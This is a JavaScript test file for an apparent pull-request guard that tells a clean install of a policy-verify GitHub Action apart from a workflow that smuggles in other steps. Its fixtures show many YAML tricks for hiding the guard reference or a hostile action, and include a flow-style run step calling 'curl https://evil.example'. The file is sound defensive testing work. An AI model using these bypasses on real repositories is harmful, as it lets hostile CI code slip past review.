// Accepting any indented uses: let a workflow park the guard reference in inert
// data (env:, with:, a strategy matrix) while running something else, and the
// line-oriented scan could not see flow-style steps at all. Both halves of that
// bypass are one PR: guard in data, hostile action in a flow step.
const GUARD_REF = "aporthq/policy-verify-action@v1";
const wf = (patch) =>
  onPullRequest({ files: [{ filename: ".github/workflows/w.yml", status: "added", patch }] });
const wfBlocks = (patch) => blockingCodes(wf(patch)).length > 0;

assert(!wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a normal install still reads as one");
assert(!wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      - name: guard",
                  `+        uses: ${GUARD_REF}`].join("\n")),
  "uses: as a later key of the step mapping still reads as one");

for (const [label, lines] of [
  ["an env: mapping", ["+jobs:", "+  d:", "+    env:", `+      uses: ${GUARD_REF}`,
                       "+    steps:", "+      - uses: evil/action@v1"]],
  ["a with: mapping", ["+jobs:", "+  d:", "+    steps:", "+      - uses: evil/action@v1",
                       "+        with:", `+          uses: ${GUARD_REF}`]],
  ["a strategy matrix", ["+jobs:", "+  d:", "+    strategy:", "+      matrix:",
                         `+        uses: ${GUARD_REF}`, "+    steps:", "+      - uses: evil/a@v1"]],
  ["workflow_call inputs", ["+on:", "+  workflow_call:", "+    inputs:",
                            `+      uses: ${GUARD_REF}`, "+jobs:", "+  d:", "+    steps:",
                            "+      - run: echo"]],
]) {
  assert(wfBlocks(["@@", ...lines].join("\n")),
    `a guard reference in ${label} is data, not an install`);
}

// Flow style runs like any other step, so a hostile action written that way has
// to be seen.
assert(wfBlocks(["@@", "+jobs:", "+  d:", "+    steps:",
                 "+      - { uses: evil/action@v1 }", `+      - { uses: ${GUARD_REF} }`].join("\n")),
  "a flow-style hostile step disqualifies the install");
assert(wfBlocks(["@@", "+jobs:", "+  d:", `+    steps: [{uses: ${GUARD_REF}}, {uses: evil/a@v1}]`].join("\n")),
  "a flow-style steps array is scanned for every uses:");

// The scan itself, isolated. The two fixes above overlap -- flow-style scanning
// catches some of the same PRs -- so assert the executable-position rule
// directly, or a regression in it hides behind the other check.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  d:\n    env:\n      uses: aporthq/policy-verify-action@v1\n" +
    "    steps:\n      - uses: actions/checkout@v4\n",
  ),
  ["actions/checkout@v4"],
  "a uses: in an env: mapping is data and is not returned",
);
assert.deepEqual(
  workflowExecutableUses("jobs:\n  v:\n    steps:\n      - uses: aporthq/policy-verify-action@v1\n"),
  ["aporthq/policy-verify-action@v1"],
  "a real step is returned",
);
assert.deepEqual(
  workflowExecutableUses("jobs:\n  call:\n    uses: octo/repo/.github/workflows/w.yml@v1\n"),
  ["octo/repo/.github/workflows/w.yml@v1"],
  "jobs.<id>.uses is executable and is returned",
);
assert.deepEqual(
  workflowExecutableUses("jobs:\n  d:\n    steps:\n      - { uses: evil/action@v1 }\n"),
  ["evil/action@v1"],
  "a flow-style step is scanned",
);

// Raised on the mirror repo (policy-verify-action PRs 16 and 17), verified here
// because this directory is the source of truth.
for (const [label, lines] of [
  ["a job-level reusable workflow call", [
    "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
    "+  deploy:", "+    uses: attacker/repo/.github/workflows/deploy.yml@abc123"]],
  ["a flow-style run step", [
    "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
    "+      - { run: curl https://evil.example }"]],
]) {
  assert(wfBlocks(["@@", ...lines].join("\n")),
    `${label} means the workflow does more than install the guard`);
}

// Codex review of this branch. Each case turned on an assumption the hand-rolled
// scanner made about layout rather than about YAML.

// A: the job mapping's child indent is read from the file. Hardcoding two spaces
// meant a four-space workflow's reusable-workflow call was never returned, so a
// file carrying the guard AND a hostile call still read as a plain install.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n    verify:\n        steps:\n            - uses: " + GUARD_REF + "\n" +
    "    deploy:\n        uses: attacker/repo/.github/workflows/x.yml@sha\n",
  ),
  [GUARD_REF, "attacker/repo/.github/workflows/x.yml@sha"],
  "a four-space reusable workflow call is executable and is returned",
);
assert(
  wfBlocks(["@@", "+jobs:", "+    verify:", "+        steps:",
            `+            - uses: ${GUARD_REF}`, "+    deploy:",
            "+        uses: attacker/repo/.github/workflows/x.yml@sha"].join("\n")),
  "a four-space hostile reusable workflow call disqualifies the install",
);

// B: a sequence item may sit at the same column as the `steps:` key that owns
// it. Requiring a deeper indent hid the guard step, blocking a clean install.
assert.deepEqual(
  workflowExecutableUses("jobs:\n  v:\n    steps:\n    - uses: " + GUARD_REF + "\n"),
  [GUARD_REF],
  "a step at the same indent as steps: is still a step",
);
assert(
  !wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+    - uses: ${GUARD_REF}`].join("\n")),
  "an install written with indentationless sequence items still reads as one",
);

// C: hasRunStep has to look inside an inline steps array. The executable scan
// finds the guard there, so missing the shell step handed the carve-out to a
// workflow that runs arbitrary code.
assert(
  wfBlocks(["@@", "+jobs:", "+  v:",
            `+    steps: [{ uses: ${GUARD_REF} }, { run: whoami }]`].join("\n")),
  "a run: step inside an inline steps array disqualifies the install",
);

// D: only the step mapping's own `uses` key executes. Collecting every `uses:`
// in the flow mapping let the guard reference hide in a nested input value --
// the inert-data bypass, reintroduced for flow style.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - { uses: actions/checkout@v4, with: { uses: " +
    GUARD_REF + " } }\n",
  ),
  ["actions/checkout@v4"],
  "a uses: nested in a flow-style with: is data and is not returned",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
            `+      - { uses: actions/checkout@v4, with: { uses: ${GUARD_REF} } }`].join("\n")),
  "the guard hidden in a flow-style with: does not qualify as an install",
);

// E: comments are not YAML structure. A column-zero comment between step items
// must not clear the active steps sequence and hide the later hostile action.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
    "# reviewed by security\n      - uses: attacker/action@v1\n",
  ),
  [GUARD_REF, "attacker/action@v1"],
  "comment-only lines do not leave the active steps sequence",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
            "+# reviewed by security", "+      - uses: attacker/action@v1"].join("\n")),
  "a hostile action after a comment-only line disqualifies the install",
);

// F: YAML anchors on job ids do not change the mapping. The anchored job still
// owns its child keys, including a reusable-workflow call.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  deploy: &deploy\n    uses: attacker/repo/.github/workflows/x.yml@main\n" +
    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
  "a reusable workflow under an anchored job id is executable",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  deploy: &deploy",
            "+    uses: attacker/repo/.github/workflows/x.yml@main",
            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
  "an anchored hostile reusable workflow disqualifies the install",
);

// G: escaped quotes inside nested flow values must stay inside the nested
// value; inert string text that looks like a guard step must not be promoted to
// an outer `uses` key.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - { uses: attacker/action@v1, with: { note: \"x \\\" }, uses: " +
    GUARD_REF + "\" } }\n",
  ),
  ["attacker/action@v1"],
  "escaped quotes in nested flow values do not expose fake outer uses keys",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
            `+      - { uses: attacker/action@v1, with: { note: "x \\" }, uses: ${GUARD_REF}" } }`].join("\n")),
  "a fake guard in a quoted nested flow value does not qualify as an install",
);

// H: a flow-style steps array may be split across lines. Those entries are
// still the steps sequence and must be scanned before allowing a bootstrap.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  guard:\n    steps: [{ uses: " + GUARD_REF + " }]\n" +
    "  v:\n    steps: [\n      { uses: attacker/action@v1 }\n    ]\n",
  ),
  [GUARD_REF, "attacker/action@v1"],
  "multiline flow-style steps arrays are scanned",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  guard:", `+    steps: [{ uses: ${GUARD_REF} }]`,
            "+  v:", "+    steps: [", "+      { uses: attacker/action@v1 }", "+    ]"].join("\n")),
  "a hostile action in a multiline flow steps array disqualifies the install",
);

// I: a bare sequence indicator is still a step. Its following indented mapping
// must be treated as the step body.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
    "      -\n        uses: attacker/action@v1\n",
  ),
  [GUARD_REF, "attacker/action@v1"],
  "a bare dash followed by uses: is a step mapping",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
            "+      -", "+        uses: attacker/action@v1"].join("\n")),
  "a hostile action after a bare step indicator disqualifies the install",
);

// J: flow-style `run` keys outside the active steps sequence are inert data and
// should not turn a clean bootstrap into a high-severity control-plane change.
assert(
  !wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
             "+        include:", "+          - { run: harmless }",
             "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a flow-style run key in matrix data is not an executable shell step",
);

// K: required SHA pinning must also inspect flow-style executable action refs.
assert.deepEqual(
  findUnpinnedActions("jobs:\n  v:\n    steps:\n      - { uses: " + GUARD_REF + " }\n"),
  [GUARD_REF],
  "flow-style executable actions are checked for SHA pinning",
);

// L: flow-style mappings outside steps are data. A fake guard in matrix data
// must not make a workflow with only checkout look like a guard install.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    strategy:\n      matrix:\n        include:\n          - { uses: " +
    GUARD_REF + " }\n    steps:\n      - uses: actions/checkout@v4\n",
  ),
  ["actions/checkout@v4"],
  "flow-style mappings are only scanned as actions under the active steps sequence",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
            "+        include:", `+          - { uses: ${GUARD_REF} }`,
            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
  "a guard hidden in flow-style matrix data does not qualify as an install",
);

// M: the child column of a block-style step is the actual first key after the
// dash, not always dash-column + 2. Multiple separation spaces are valid YAML.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      -    name: bad\n           uses: attacker/action@v1\n" +
    "      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/action@v1", GUARD_REF],
  "step keys align with the actual mapping column after a dash",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      -    name: bad",
            "+           uses: attacker/action@v1", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a hostile action aligned under a wide dash separator disqualifies the install",
);

// N: YAML only treats backslash as an escape in double-quoted scalars. A
// single-quoted value ending in a literal backslash must not keep the scanner
// in quote mode and hide the later outer uses key.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - { with: { note: '\\\\' }, uses: attacker/action@v1 }\n" +
    "      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/action@v1", GUARD_REF],
  "single-quoted backslashes do not escape the closing quote",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
            "+      - { with: { note: '\\\\' }, uses: attacker/action@v1 }",
            `+      - uses: ${GUARD_REF}`].join("\n")),
  "an attacker action after a single-quoted backslash disqualifies the install",
);

// O: explicit-key YAML syntax (`? key` then `:`) is equivalent to a normal
// mapping key and can define a reusable-workflow job.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  ? deploy\n  :\n    uses: attacker/repo/.github/workflows/x.yml@main\n" +
    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
  "explicit YAML job keys establish reusable-workflow job scope",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  ? deploy", "+  :",
            "+    uses: attacker/repo/.github/workflows/x.yml@main",
            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a hostile reusable workflow under an explicit job key disqualifies the install",
);

// P: an alias used as a step may resolve to executable YAML anchored elsewhere.
// The lightweight scanner does not resolve anchors, so it must fail closed for
// bootstrap classification instead of pretending the alias is harmless.
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
            "+        include:", "+          - &bad", "+            uses: attacker/action@v1",
            "+    steps:", `+      - uses: ${GUARD_REF}`, "+      - *bad"].join("\n")),
  "a step alias disqualifies a bootstrap install unless it is resolved",
);

// Q: a flow-style step mapping may span lines. It is still one executable step.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - { name: hostile,\n          uses: attacker/action@v1 }\n" +
    "      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/action@v1", GUARD_REF],
  "multiline flow-style step mappings are scanned",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      - { name: hostile,",
            "+          uses: attacker/action@v1 }", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a hostile action in a multiline flow-style step disqualifies the install",
);

// R: reusable-workflow jobs can also be written as flow mappings.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  deploy: { uses: attacker/repo/.github/workflows/x.yml@main }\n" +
    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
  "flow-style reusable workflow jobs are executable",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  deploy: { uses: attacker/repo/.github/workflows/x.yml@main }",
            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
  "a hostile flow-style reusable workflow disqualifies the install",
);
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    env: { uses: " + GUARD_REF + " }\n" +
    "    steps:\n      - uses: actions/checkout@v4\n",
  ),
  ["actions/checkout@v4"],
  "flow mappings below a job do not count as reusable-workflow jobs",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", `+    env: { uses: ${GUARD_REF} }`,
            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
  "a fake guard reference in job data does not qualify as an install",
);

// S: an anchor before a block-style step key does not make that key inert.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    steps:\n      - &bad uses: attacker/action@v1\n" +
    "      - uses: " + GUARD_REF + "\n",
  ),
  ["attacker/action@v1", GUARD_REF],
  "anchors before block-style step keys are ignored for executable scanning",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
            "+      - &bad uses: attacker/action@v1", `+      - uses: ${GUARD_REF}`].join("\n")),
  "an anchored hostile block-style step disqualifies the install",
);

// T: `steps` inside matrix data is inert. It must not activate executable-step
// scanning or let a fake guard reference qualify for bootstrap.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  v:\n    strategy:\n      matrix:\n        steps: [{ uses: " + GUARD_REF +
    " }]\n    steps:\n      - uses: actions/checkout@v4\n",
  ),
  ["actions/checkout@v4"],
  "matrix dimensions named steps are not executable steps",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
            `+        steps: [{ uses: ${GUARD_REF} }]`,
            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
  "a guard hidden in matrix.steps does not qualify as an install",
);

// U: pin checks may see only the added line of a modified workflow. Flow-style
// action refs must still be checked without the unchanged surrounding steps key.
assert.deepEqual(
  findUnpinnedActions("- { uses: evil/action@v1 }"),
  ["evil/action@v1"],
  "flow-style patch fragments are checked for SHA pinning",
);

// V: explicit-key YAML syntax can also define a job's `steps` key.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
    "  v:\n    ? steps\n    :\n      - uses: attacker/action@v1\n",
  ),
  [GUARD_REF, "attacker/action@v1"],
  "explicit YAML steps keys establish executable step scope",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
            "+  v:", "+    ? steps", "+    :", "+      - uses: attacker/action@v1"].join("\n")),
  "a hostile action under an explicit steps key disqualifies the install",
);

// W: an alias can stand in for the entire steps sequence. Without anchor
// resolution, the safe bootstrap behavior is to disqualify the install.
assert(
  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
            "+        include: &payload", "+          - uses: attacker/action@v1",
            "+    steps: *payload", "+  guard:", "+    steps:",
            `+      - uses: ${GUARD_REF}`].join("\n")),
  "an aliased steps sequence disqualifies a bootstrap install",
);

// X: YAML comments start outside quoted scalars only. A hash inside a quoted
// flow value must not truncate the executable step before its closing braces.
assert.deepEqual(
  workflowExecutableUses(
    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
    "      - { uses: attacker/action@v1, with: { note: \"hello # world\" } }\n",
  ),
  [GUARD_REF, "attacker/action@v1"],
  "quoted hash characters inside flow values do not truncate executable steps",
);
assert(
  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
            "+      - { uses: attacker/action@v1, with: { note: \"hello # world\" } }"].join("\n")),
  "a hostile flow step with a quoted hash disqualifies the install",
);

// Y: pin fallback for isolated patch fragments must not scan inert flow data
// when the added source includes enough workflow context to scope executable
// steps precisely.
assert.deepEqual(
  findUnpinnedActions(
    "jobs:\n  v:\n    strategy:\n      matrix:\n        include:\n          - { uses: harmless-label@v1 }\n" +
    "    steps:\n      - uses: aporthq/policy-verify-action@" + "a".repeat(40) + "\n",
  ),
  [],
  "flow-style pin fallback ignores inert data when workflow scope is present",
);

console.log("OK structural.test.js");
